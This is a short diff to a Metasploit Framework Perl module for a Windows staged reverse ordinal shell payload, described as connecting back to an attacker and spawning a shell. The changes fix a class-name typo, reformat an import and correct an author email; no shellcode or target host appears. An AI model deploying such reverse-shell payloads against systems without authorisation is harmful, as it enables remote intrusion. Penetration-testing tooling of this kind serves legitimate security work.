@@ -11,7 +11,9 @@ package Msf::Payload::win32_reverse_ord;
 use strict;
 use base 'Msf::PayloadComponent::Win32PipedShellStage';
 sub _Load {
-  Msf::PayloadComponent::Win32ShellPipedStage->import('Msf::PayloadComponent::Win32ReverseOrdinalStager');
+  Msf::PayloadComponent::Win32PipedShellStage->import(
+    'Msf::PayloadComponent::Win32ReverseOrdinalStager'
+  );
   __PACKAGE__->SUPER::_Load();
 }
 
@@ -20,7 +22,7 @@ my $info =
   'Name'         => 'Windows Staged Reverse Ordinal Shell',
   'Version'      => '$Revision$',
   'Description'  => 'Connect back to attacker and spawn a shell',
-  'Authors'      => [ 'spoonm <ninjatool [at] hush.com>', ],
+  'Authors'      => [ 'spoonm <ninjatools [at] hush.com>', ],
 };
 
 sub new {
